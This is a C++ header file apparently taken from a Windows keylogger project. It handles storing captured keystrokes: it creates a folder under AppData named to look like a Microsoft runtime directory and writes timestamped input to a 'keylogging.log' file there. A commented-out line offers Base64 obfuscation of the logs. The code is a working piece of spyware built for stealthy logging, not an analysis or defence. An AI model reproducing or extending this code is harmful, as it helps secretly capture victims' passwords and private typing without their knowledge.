#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    std::string GetOPath(const bool append_seperator = false)
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string  full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_seperator ? "\\" : "");
    }

    bool MkDr(std::string path) //Making directory
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool ChcDr(std::string path) //If directory not exist create new one
    {
        for(char &c : path)
            if(c == '\\')
            {
                c='\0';
                if(!MkDr(path))
                    return false;
                c ='\\';
            }

        return true;
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOPath(true);
        Helper::DateTime dt;
        std::string name = "keylogging.log"; //keylog file name

        try
        {
            std::ofstream file(path + name);
            if(!file) return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" <<
            std::endl << t << std::endl;
            //std::string data = Base64::EncryptBase64(s.str()); //optional base64 + salting
            std::string data = s.str();
            file << data;
            if (!file)
                return "";
            file.close();
            return name;

        }
        catch(...)
        {
            return "";
        }

    }

}


#endif // IO_H
